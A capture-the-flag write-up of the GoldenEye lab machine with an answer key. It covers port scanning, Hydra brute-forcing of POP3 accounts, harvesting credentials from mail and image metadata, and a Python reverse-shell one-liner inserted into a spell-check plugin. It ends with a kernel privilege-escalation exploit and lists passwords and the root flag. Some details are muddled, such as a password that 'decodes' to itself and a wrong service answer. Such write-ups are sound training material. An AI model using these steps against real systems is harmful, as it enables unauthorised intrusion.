# **Golden-Eye Writeup by Brandon Gerber**

---

## **Task 1: Intro and Enumeration**

I began by scanning the target machine using `nmap` to identify open ports:

```
nmap -n -v -sT -p- -T5 <IP>
This revealed 4 open ports.

Next, I checked the source code of the website and found some comments:



// contacting a user named boris
// left encoded password
// mentioned another person named Natalya
Based on this, I assumed "boris" was a username, and I found an encoded password in the comments:
InvincibleHack3r

Using an HTML decoder, I decoded it to: InvincibleHack3r
I realized I could have just used dcode<pw>

Task 2: It’s Mail Time
Next, I tried logging in via telnet to the POP3 service on port 55007, but the credentials failed. The next hint was to use Hydra to crack the password:



hydra -l boris -P <path_to_password_list> <IP> -s 55007 pop3
This successfully found the password:
Password: secret1!

I then logged in via telnet:



telnet <IP> 55007
user boris
pass secret1!
After logging in, I listed and retrieved the emails using retr <email num>, revealing another username, "Xenia."

Using Hydra again, I cracked Xenia’s password:



hydra -l Xenia -P <path_to_password_list> <IP> -s 55007 pop3
The password was bird. After logging into her account, I found her new password: RCP90rulez.

This led me to the next hint regarding the severnaya-station.com website. I added it to my /etc/hosts file to access it:



nano /etc/hosts
# Add the line
<IP> severnaya-station.com
I visited http://severnaya-station.com/gnocertdir/ and used Xenia's credentials to log in:



user: Xenia
pass: RCP90rulez!
Under "My Profile," I found a message from Dr. Doak revealing his creds:



hydra -l Doak -P <path_to_wordlist> <IP> -s 55007 pop3
Password: goat
Using telnet again, I found his password in an email: 4England!

Task 3: Gaining Access
Logging in with Dr. Doak's credentials (dr_doak, 4England!), I explored his private files and discovered a file named s3cret.txt, which mentioned the location of an image at /dir007key/for-007.jpg. I downloaded the image using wget and extracted hidden information with exiftool. Inside the description field, I found a Base64 string:



eFdpbnRlckE50TV4IQ==
Decoded, it revealed: xWinter1995x!



user: admin
pass: xWinter1995x!
Task 4: Exploitation
I created a reverse shell using Python:



python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>", <Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
I inserted this script into the spell check plugin on the website, then started a listener using pwncat:



pwncat --listen -p 9999
This granted me a shell on the system. The kernel version was 3.13.0-32-generic, and I found an overlayfs privilege escalation exploit (https://www.exploit-db.com/exploits/37292).

I compiled and executed the exploit:



upload exploit.c /tmp
cd /tmp
cc exploit.c -o exploit
./exploit
This gave me root access. I navigated to the /root directory and found the final flag:



cat flag.txt
Root flag: 568628e0d993b1973adc718237da6e93

ANSWERS
Task 1:
How many ports are open?
Answer: 4

Who needs to update their default password?
Answer: boris

What's their password?
Answer: InvincibleHack3r

Task 2:
What's their new password?
Answer: secret1!

What services is configured to use port 55007?
Answer: telnet

What user can break Boris' codes?
Answer: natalya

What user can you login as on the severnaya-station.com site?
Answer: xenia

What was Doak's password?
Answer: goat

What's Dr. Doak's password?
Answer: 4England!

Task 3:
What's the kernel version?
Answer: 3.13.0-32-generic

What is the root flag?
Answer: 568628e0d993b1973adc718237da6e93
